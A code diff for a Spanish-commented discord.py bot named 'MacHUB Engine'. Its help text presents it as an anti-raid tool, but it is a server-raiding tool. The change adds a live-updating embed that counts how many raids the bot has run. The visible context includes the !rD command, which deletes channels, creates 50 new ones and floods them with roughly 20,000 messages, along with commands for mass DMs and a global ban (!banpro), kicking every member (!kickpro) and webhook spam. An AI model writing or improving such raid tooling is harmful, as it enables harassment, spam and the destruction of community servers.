@@ -4,7 +4,7 @@ import asyncio
 import logging
 import os
 import random
-from datetime import datetime  # Necesario para calcular el uptime
+from datetime import datetime
 
 # Configuración de logging optimizada para monitoreo
 logging.basicConfig(
@@ -19,10 +19,11 @@ TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
 # El banner animado de Discord configurado de forma global
 GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
 
-# Configuración de variables globales para el contador y tiempo de inicio
+# Configuración de variables globales
 ejecuciones_actuales = 0
 MAX_EJECUCIONES = 2
-tiempo_inicio = datetime.now()  # Guarda el momento exacto en que inicia el script
+tiempo_inicio = datetime.now()
+ultimo_msg_eje = None  # Guarda el último mensaje de !eje para poder editarlo
 
 # Configuración explícita de los Intents necesarios
 intents = discord.Intents.default()
@@ -35,23 +36,46 @@ bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 @bot.event
 async def on_ready():
     global tiempo_inicio
-    tiempo_inicio = datetime.now()  # Reinicia el tiempo al conectar con Discord
+    tiempo_inicio = datetime.now()
     logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")
 
 
-# ================= NUEVO: COMANDO EJE =================
+# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
+def generar_embed_eje():
+    global ejecuciones_actuales, MAX_EJECUCIONES
+    
+    # Color estético: Verde si está libre (0), Amarillo si lleva 1, Rojo si está lleno (2)
+    color = discord.Color.green() if ejecuciones_actuales == 0 else (discord.Color.orange() if ejecuciones_actuales == 1 else discord.Color.red())
+    
+    embed = discord.Embed(
+        title="📊 CONTROL DE EJECUCIONES",
+        description=f"**Ejecuciones del bot en:** `{ejecuciones_actuales}/{MAX_EJECUCIONES}`",
+        color=color
+    )
+    embed.set_footer(text="MacHUB Engine • Monitoreo en tiempo real")
+    embed.timestamp = datetime.now()
+    return embed
+
+
+# ================= COMANDO !eje (CON AUTODETECCIÓN Y EDICIÓN) =================
 @bot.command()
 async def eje(ctx):
-    global ejecuciones_actuales
-    menu = (
-        "============================================\n"
-        f"!eje          -> Muestra el estado de ejecuciones del bot ({ejecuciones_actuales}/{MAX_EJECUCIONES}).\n"
-        "============================================\n"
-    )
+    global ultimo_msg_eje
+    embed = generar_embed_eje()
+    
     try:
-        await ctx.send(f"```\n{menu}```")
+        # Si ya enviamos un mensaje antes en este canal, intentamos editarlo
+        if ultimo_msg_eje:
+            await ultimo_msg_eje.edit(embed=embed)
+            # Borramos el comando del usuario para mantener el chat limpio
+            try: await ctx.message.delete()
+            except: pass
+        else:
+            # Si es la primera vez, mandamos uno nuevo y guardamos la ID
+            ultimo_msg_eje = await ctx.send(embed=embed)
     except:
-        pass
+        # Si por alguna razón el mensaje viejo fue borrado manualmente, mandamos uno nuevo
+        ultimo_msg_eje = await ctx.send(embed=embed)
 
 
 # ================= 1. COMANDO BANPRO =================
@@ -87,7 +111,7 @@ async def banpro(ctx):
 # ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
 @bot.command()
 async def rD(ctx):
-    global ejecuciones_actuales
+    global ejecuciones_actuales, ultimo_msg_eje
     
     if not ctx.author.guild_permissions.manage_channels: return
     if not ctx.guild.me.guild_permissions.manage_channels: return
@@ -110,7 +134,6 @@ async def rD(ctx):
             created_channels.append(ch)
         except: pass
 
-    # Distribución para alcanzar entre 14k y 20k mensajes en total
     msg_por_canal = 400 
     
     async def spam_task(channel):
@@ -127,6 +150,11 @@ async def rD(ctx):
 
     # Sumamos una ejecución tras finalizar el raid
     ejecuciones_actuales += 1
+
+    # Auto-actualizar el Embed de !eje de inmediato si ya estaba en pantalla
+    if ultimo_msg_eje:
+        try: await ultimo_msg_eje.edit(embed=generar_embed_eje())
+        except: pass
 
 
 # ================= 3. EXPULSIÓN MASIVA =================
@@ -300,7 +328,7 @@ async def hookpro(ctx):
     await asyncio.gather(*tasks)
 
 
-# ================= 11. NUEVO: COMANDO UPTIME (Reemplaza a ping) =================
+# ================= 11. COMANDO UPTIME =================
 @bot.command()
 async def uptime(ctx):
     try:
@@ -327,7 +355,7 @@ async def ayuda(ctx):
         "```\n"
         "=== Mc R Anti raid - cmds ===\n"
         "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
-        "!eje          -> Muestra el estado de ejecuciones del bot (0/2, 1/2, 2/2).\n"
+        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
         "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
@@ -352,4 +380,4 @@ async def on_command_error(ctx, error):
     logging.error(f"Error: {error}")
 
 bot.run(TOKEN)
-    
+        
